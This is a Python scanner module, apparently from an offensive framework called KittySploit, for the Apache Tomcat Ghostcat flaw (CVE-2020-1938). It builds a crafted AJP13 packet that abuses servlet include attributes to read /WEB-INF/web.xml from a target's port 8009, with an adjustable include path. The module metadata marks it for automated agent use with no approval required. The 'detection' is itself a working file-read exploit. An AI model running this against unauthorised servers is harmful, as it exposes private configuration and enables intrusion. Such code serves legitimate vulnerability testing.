#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Tomcat AJP Ghostcat file read / include (CVE-2020-1938)."""

import socket
import struct

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


def _ajp_string(s: str) -> bytes:
    b = s.encode('utf-8', errors='replace')
    return struct.pack('>H', len(b)) + b + b'\x00'


def _build_ghostcat_pkt(remote_ip: str, server_name: str, include_path: str = '/WEB-INF/web.xml') -> bytes:
    """Build an AJP13 FORWARD_REQUEST that forces include of include_path (Ghostcat)."""
    body = bytearray()
    body.append(0x02)  # FORWARD_REQUEST
    body.append(0x02)  # GET
    body += _ajp_string('HTTP/1.1')
    body += _ajp_string('/')
    body += _ajp_string(remote_ip)
    body += b'\xff\xff'  # remote host unused
    body += _ajp_string(server_name)
    body += struct.pack('>H', 80)  # server port
    body.append(0x00)  # is_ssl = false

    # NHDR = 4 attribute-style headers after coded Host + Accept-Encoding
    # NASL uses NHDR=2 coded headers + 3 attributes (0x0a...)
    # Recreate Greenbone packet shape closely.
    headers = []
    # coded header Host (0xa00b)
    headers.append(b'\xa0\x0b' + _ajp_string(server_name))
    # coded? Accept-Encoding as named
    headers.append(_ajp_string('Accept-Encoding') + _ajp_string('identity'))
    # attributes
    attrs = []
    attrs.append(b'\x0a' + _ajp_string('AJP_REMOTE_PORT') + _ajp_string('38434'))
    attrs.append(b'\x0a' + _ajp_string('javax.servlet.include.servlet_path') + _ajp_string(include_path))
    attrs.append(b'\x0a' + _ajp_string('javax.servlet.include.request_uri') + _ajp_string('1'))

    body += struct.pack('>H', len(headers))
    for h in headers:
        body += h
    for a in attrs:
        body += a
    body.append(0xff)  # request_terminator

    return b'\x12\x34' + struct.pack('>H', len(body)) + bytes(body)


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'Apache Tomcat AJP - Ghostcat Detection (CVE-2020-1938)',
        'description': (
            'Detects CVE-2020-1938 (Ghostcat) by sending a crafted AJP13 FORWARD_REQUEST '
            'that includes /WEB-INF/web.xml via javax.servlet.include.servlet_path.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'ajp', 'tomcat', 'cve', 'cve2020', 'lfi', 'rce', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.chaitin.cn/en/ghostcat',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-1938',
        ],
        'cve': 'CVE-2020-1938',
    }

    port = OptPort(8009, 'AJP port', True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host=host, port=port):
            return False
        pkt = _build_ghostcat_pkt(host, host, '/WEB-INF/web.xml')
        try:
            with socket.create_connection((host, port), timeout=max(self._timeout(), 5.0)) as sock:
                sock.settimeout(max(self._timeout(), 5.0))
                sock.sendall(pkt)
                data = sock.recv(8192)
        except OSError:
            return False
        if not data or len(data) < 7:
            return False
        # SEND_HEADERS = 0x04 at offset 4, status word at offset 5
        if data[4] != 0x04:
            return False
        status = struct.unpack('>H', data[5:7])[0]
        text = data.decode('latin-1', errors='ignore')
        if status == 200 and ('web-app' in text or 'WEB-INF' in text or '<servlet>' in text):
            self.set_info(
                severity='critical',
                reason='Tomcat Ghostcat (CVE-2020-1938): /WEB-INF/web.xml via AJP',
                path=f'ajp://{host}:{port}/WEB-INF/web.xml',
            )
            return True
        # Greenbone also flags non-403 status as likely vulnerable.
        if status != 403 and status != 0:
            self.set_info(
                severity='high',
                reason=f'Tomcat Ghostcat fingerprint: AJP include returned status {status} (expected 403 when patched)',
                path=f'ajp://{host}:{port}/',
            )
            return True
        return False
